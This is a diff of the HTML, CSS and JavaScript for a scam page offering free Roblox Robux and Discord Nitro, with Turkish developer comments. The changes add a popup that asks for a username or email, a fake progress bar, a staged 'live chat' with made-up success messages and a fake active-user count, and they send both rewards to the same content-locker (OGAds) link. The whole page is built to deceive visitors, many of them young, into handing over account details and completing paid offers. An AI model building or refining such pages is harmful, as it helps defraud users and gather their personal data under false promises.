@@ -16,17 +16,15 @@
             color: #fff;
             padding: 20px;
         }
-        .container { display: flex; gap: 20px; max-width: 1200px; width: 100%; flex-wrap: wrap; justify-content: center; align-items: flex-start; }
+        .container { display: flex; gap: 20px; max-width: 900px; width: 100%; flex-wrap: wrap; justify-content: center; align-items: flex-start; }
         .card { background: rgba(28, 30, 39, 0.95); border-radius: 14px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); border: 1px solid rgba(255,255,255,0.03); backdrop-filter: blur(5px); }
         .side-card { flex: 1; min-width: 290px; max-width: 350px; display: flex; flex-direction: column; }
         .main-card { flex: 2; min-width: 320px; max-width: 460px; text-align: center; }
         
-        .card-header-area { display: flex; align-items: center; gap: 12px; margin-bottom: 15px; }
-        .help-icon-box { width: 36px; height: 36px; background: #3b82f6; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 18px; }
-        h2 { font-size: 20px; font-weight: 700; }
-        .card-sub { color: #8e9297; font-size: 12px; margin-top: -12px; margin-bottom: 15px; display: block; }
+        h2 { font-size: 20px; font-weight: 700; margin-bottom: 15px; }
         .subtitle { color: #8e9297; font-size: 13px; margin-bottom: 25px; }
         
+        /* Ödül Seçim Alanı */
         .reward-grid { display: flex; gap: 15px; justify-content: center; margin-bottom: 20px; }
         .reward-item { background: #252836; border-radius: 10px; padding: 25px; flex: 1; cursor: pointer; border: 2px solid transparent; text-decoration: none; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 160px; transition: transform 0.2s, border-color 0.2s; }
         .reward-item:hover { transform: translateY(-3px); border-color: #ff73fa; }
@@ -35,6 +33,7 @@
         .reward-title { font-weight: bold; font-size: 16px; margin-bottom: 5px; }
         .reward-desc { font-size: 11px; color: #b9bbbe; }
         
+        /* Canlı Sohbet Yapısı */
         .chat-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #2f3241; padding-bottom: 10px; margin-bottom: 15px; }
         .status { font-size: 12px; color: #23a55a; font-weight: bold; }
         .chat-box { height: 240px; overflow: hidden; display: flex; flex-direction: column; gap: 12px; font-size: 12px; text-align: left; flex-grow: 1; }
@@ -46,98 +45,33 @@
         .chat-input-area input { flex: 1; background: #252836; border: 1px solid rgba(255,255,255,0.05); border-radius: 6px; padding: 8px 12px; color: #fff; font-size: 12px; cursor: not-allowed; }
         .chat-input-area button { background: #ff73fa; border: none; color: #fff; padding: 8px 12px; border-radius: 6px; font-size: 12px; font-weight: bold; cursor: not-allowed; opacity: 0.6; }
         
-        .help-list { display: flex; flex-direction: column; gap: 10px; background: rgba(255,255,255,0.01); padding: 10px; border-radius: 10px; }
-        .accordion-item { background: #252836; border-radius: 8px; overflow: hidden; border: 1px solid rgba(255,255,255,0.02); }
-        .accordion-header { padding: 12px 15px; font-size: 13px; font-weight: bold; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: background 0.2s; user-select: none; }
-        .accordion-header:hover { background: #2f3245; }
-        .accordion-arrow { font-size: 10px; color: #8e9297; transition: transform 0.2s; }
-        .accordion-content { max-height: 0; overflow: hidden; transition: max-height 0.2s ease-out; background: rgba(0,0,0,0.1); font-size: 12px; color: #b9bbbe; line-height: 1.5; }
-        .accordion-content-inner { padding: 15px; }
-        .accordion-item.active .accordion-content { max-height: 250px; }
-        .accordion-item.active .accordion-arrow { transform: rotate(180deg); }
+        /* POPUP MODAL (KULLANICI ADI PENCERESİ) */
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); justify-content: center; align-items: center; z-index: 999; }
+        .modal-content { background: #1c1e27; padding: 30px; border-radius: 14px; width: 90%; max-width: 400px; text-align: center; border: 1px solid rgba(255,255,255,0.05); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .modal-input { width: 100%; background: #252836; border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 12px; color: #fff; font-size: 14px; text-align: center; margin: 20px 0; outline: none; }
+        .modal-input:focus { border-color: #5865F2; }
+        .modal-btn { background: #5865F2; color: #fff; border: none; padding: 12px 25px; border-radius: 8px; font-size: 14px; font-weight: bold; cursor: pointer; width: 100%; transition: background 0.2s; }
+        .modal-btn:hover { background: #4752C4; }
         
-        @media(max-width: 992px) { .container { flex-direction: column; align-items: center; } .side-card { max-width: 100%; width: 100%; } }
+        /* Yükleme Efekti */
+        .loading-status { display: none; font-size: 13px; color: #b9bbbe; margin-top: 15px; font-weight: bold; }
+        .progress-bar-container { display: none; width: 100%; background: #252836; height: 6px; border-radius: 3px; overflow: hidden; margin-top: 15px; }
+        .progress-bar { width: 0%; height: 100%; background: #23a55a; transition: width 0.1s linear; }
+        
+        @media(max-width: 768px) { .container { flex-direction: column; align-items: center; } .side-card { max-width: 100%; width: 100%; } }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- HELP ACCORDION -->
-    <div class="card side-card">
-        <div class="card-header-area">
-            <div class="help-icon-box">?</div>
-            <div>
-                <h2>Help</h2>
-                <span class="card-sub">Have questions or issues?</span>
-            </div>
-        </div>
-        
-        <div class="help-list">
-            <div class="accordion-item active">
-                <div class="accordion-header">
-                    <span>How do I use this?</span>
-                    <span class="accordion-arrow">▼</span>
-                </div>
-                <div class="accordion-content">
-                    <div class="accordion-content-inner">Select a reward. For Roblox rewards, enter your Roblox username. For Nitro rewards, no username is needed. Then complete one quest.</div>
-                </div>
-            </div>
-            <div class="accordion-item">
-                <div class="accordion-header">
-                    <span>How do I receive my prize?</span>
-                    <span class="accordion-arrow">▼</span>
-                </div>
-                <div class="accordion-content">
-                    <div class="accordion-content-inner">Roblox rewards are delivered via Roblox giftcard. Nitro rewards are delivered via Discord Nitro gift.</div>
-                </div>
-            </div>
-            <div class="accordion-item">
-                <div class="accordion-header">
-                    <span>What if I can't complete a quest?</span>
-                    <span class="accordion-arrow">▼</span>
-                </div>
-                <div class="accordion-content">
-                    <div class="accordion-content-inner">If you're having trouble with a quest, please disable your AdBlocker ⛔ if you have one as they block our quest links. If that doesn't help, try another quest (you only need to complete 1). If none work, visit the site on another device 📱💻 (phone/tablet/PC/laptop) to get different quests, or try again tomorrow.</div>
-                </div>
-            </div>
-            <div class="accordion-item">
-                <div class="accordion-header">
-                    <span>Why do I have to do a quest?</span>
-                    <span class="accordion-arrow">▼</span>
-                </div>
-                <div class="accordion-content">
-                    <div class="accordion-content-inner">Our site is funded by our partners - by completing their quests, you help us afford to give free rewards to everyone!</div>
-                </div>
-            </div>
-            <div class="accordion-item">
-                <div class="accordion-header">
-                    <span>Can I claim more than once?</span>
-                    <span class="accordion-arrow">▼</span>
-                </div>
-                <div class="accordion-content">
-                    <div class="accordion-content-inner">Yes, you can claim as many times as you want! However, keep in mind that a quest might not work again if you've done it already.</div>
-                </div>
-            </div>
-            <div class="accordion-item">
-                <div class="accordion-header">
-                    <span>Is this an official website?</span>
-                    <span class="accordion-arrow">▼</span>
-                </div>
-                <div class="accordion-content">
-                    <div class="accordion-content-inner">No - we are not affiliated with or sponsored by Roblox or Discord. We are a Team of developers, content creators, and enthusiasts working to make Roblox & Discord players happy! 💫</div>
-                </div>
-            </div>
-        </div>
-    </div>
-
     <!-- MAIN REWARDS -->
     <div class="card main-card">
-        <h2>Choose Your Reward</h2>
-        <p class="subtitle">Which reward would you like to transfer to your account today?</p>
+        <h2 id="mainTitle">Choose Your Reward</h2>
+        <p class="subtitle" id="mainSub">Which reward would you like to transfer to your account today?</p>
         
         <div class="reward-grid">
             <!-- ROBUX BUTONU -->
-            <a href="https://appsave.online/cl/i/1x3g7k" class="reward-item robux-btn">
+            <div onclick="openModal('robux')" class="reward-item robux-btn">
                 <div class="reward-icon-container">
                     <svg viewBox="0 0 100 100" width="50" height="50">
                         <rect x="25" y="25" width="50" height="50" transform="rotate(15 50 50)" fill="#00b0ff" />
@@ -146,10 +80,81 @@
                 </div>
                 <div class="reward-title">800 Robux</div>
                 <div class="reward-desc">Instant Delivery</div>
-            </a>
+            </div>
             
             <!-- NITRO BUTONU -->
-            <a href="https://appsave.online/cl/i/1x3g7k" class="reward-item">
+            <div onclick="openModal('nitro')" class="reward-item">
                 <div class="reward-icon-container">
                     <svg viewBox="0 0 100 60" width="65" height="45">
                         <path d="M10,15 L35,25 L25,35 Z" fill="#ff73fa" />
+                        <path d="M5,25 L30,30 L20,40 Z" fill="#ff73fa" opacity="0.7" />
+                        <path d="M90,15 L65,25 L75,35 Z" fill="#ff73fa" />
+                        <path d="M95,25 L70,30 L80,40 Z" fill="#ff73fa" opacity="0.7" />
+                        <polygon points="50,5 68,23 68,47 50,65 32,47 32,23" fill="#ff73fa" />
+                        <polygon points="50,14 61,27 61,43 50,56 39,27 39,43" fill="#252836" />
+                        <polygon points="50,23 57,32 50,47 43,32" fill="#ff73fa" />
+                    </svg>
+                </div>
+                <div class="reward-title">1 Month Nitro</div>
+            </div>
+        </div>
+        <p style="font-size: 11px; color:#72767d;">* Daily stock limit is 1 per account.</p>
+    </div>
+
+    <!-- LIVE CHAT -->
+    <div class="card side-card">
+        <div class="chat-header">
+            <h2>Live Chat</h2>
+            <div class="status">● <span id="activeCount">412</span> Active</div>
+        </div>
+        
+        <div class="chat-box" id="chatBox">
+            <div class="chat-msg"><span class="username">Gamer_X:</span><span class="msg-text">just claimed 800 Robux! Thanks.</span></div>
+            <div class="chat-msg"><span class="username user-nitro">Shadow99:</span><span class="msg-text">Finally a working Nitro, you are the best!</span></div>
+        </div>
+
+        <div class="chat-input-area">
+            <input type="text" placeholder="Verification required to chat..." disabled="disabled" />
+            <button disabled="disabled">Send</button>
+        </div>
+    </div>
+</div>
+
+<!-- KULLANICI ADI POPUP PENCERESİ -->
+<div class="modal-overlay" id="usernameModal">
+    <div class="modal-content">
+        <h3 id="modalTitleText" style="font-size:18px; font-weight:bold;">Enter Username</h3>
+        <p id="modalSubText" style="font-size:12px; color:#8e9297; margin-top:5px;">Please enter your profile name to receive reward</p>
+        
+        <input type="text" class="modal-input" id="usernameInput" placeholder="Username / Email..." autocomplete="off">
+        <button class="modal-btn" id="submitBtn" onclick="startVerification()">Continue</button>
+        
+        <!-- Yükleme Göstergeleri -->
+        <div class="progress-bar-container" id="progressContainer"><div class="progress-bar" id="progressBar"></div></div>
+        <div class="loading-status" id="loadingStatus">Connecting...</div>
+    </div>
+</div>
+
+<script>
+    // OGADS LINKLERİNİ BURAYA YAZACAKSIN
+    var robuxLink = "https://appsave.online/cl/i/1x3g7k";
+    var nitroLink = "https://appsave.online/cl/i/1x3g7k";
+    
+    var selectedReward = "";
+
+    // Pencereyi Açma Fonksiyonu
+    function openModal(type) {
+        selectedReward = type;
+        var modal = document.getElementById('usernameModal');
+        var input = document.getElementById('usernameInput');
+        
+        // Dil kontrolüne göre popup metinlerini ayarla
+        var uLang = (navigator.language || navigator.userLanguage).substring(0, 2).toLowerCase();
+        if(uLang === 'tr') {
+            document.getElementById('modalTitleText').innerText = "Kullanıcı Adınızı Girin";
+            document.getElementById('modalSubText').innerText = "Ödülün gönderileceği hesap adını giriniz";
+            document.getElementById('submitBtn').innerText = "Devam Et";
+            input.placeholder = "Kullanıcı Adı veya E-posta...";
+        } else {
+            document.getElementById('modalTitleText').innerText = "Enter Username";
+            document.getElementById('modalSubText').innerText = "Please enter your profile name to receive reward";
